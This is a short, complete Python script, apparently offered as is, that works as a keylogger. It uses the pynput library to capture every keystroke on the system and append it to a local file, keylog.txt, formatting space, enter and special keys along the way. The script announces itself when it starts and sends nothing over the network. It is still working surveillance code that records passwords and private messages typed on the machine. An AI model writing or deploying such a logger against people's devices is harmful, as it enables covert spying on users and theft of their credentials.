from pynput.keyboard import Listener

log_file = "keylog.txt"

def write_to_file(key):
    key_data = str(key).replace("'", "")  # clean the output
    with open(log_file, "a") as log:
        if key_data == "Key.space":
            log.write(" ")
        elif key_data == "Key.enter":
            log.write("\n")
        elif "Key" in key_data:
            log.write(f"[{key_data}]")  # special key
        else:
            log.write(key_data)

def on_press(key):
    write_to_file(key)

def main():
    print("Keylogger started. Logging keystrokes... (Press CTRL+C to stop)")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
